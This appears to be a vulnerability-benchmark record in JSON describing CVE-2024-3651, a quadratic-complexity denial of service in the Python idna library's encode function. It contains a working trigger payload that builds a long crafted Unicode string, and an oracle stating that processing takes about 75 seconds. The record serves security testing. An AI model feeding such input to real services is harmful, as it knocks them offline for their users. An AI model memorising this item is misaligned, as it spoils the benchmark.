@@ -1,0 +1,15 @@
+{
+  "file_id": "376_idna_huntr_93d78d07-d791-4b39-a845-cbfabc44aadb",
+  "numeric_id": "376",
+  "library_hint": "idna",
+  "source": "huntr",
+  "title": "idna.encode() has quadratic complexity leading to denial of service",
+  "cve": "CVE-2024-3651",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "idna",
+  "affected_version": "< 3.7",
+  "vulnerable_function": "idna.encode",
+  "triggerability": "indirect",
+  "trigger_payload": "import idna\nSIZE = 16384\nheader = [0x32, 0xdf, 0x8d]\nmiddle = [0xe2, 0x80, 0x8c] * SIZE\nfooter = [0xdf, 0x8c]\nb = bytes(header) + bytes(middle) + bytes(footer)\nd = b.decode('utf-8')\nidna.encode(d.lower(), strict=True, std3_rules=True)",
+  "oracle": "The function takes an unusually long time to process (e.g., ~75 seconds), indicating a denial of service condition."
+}
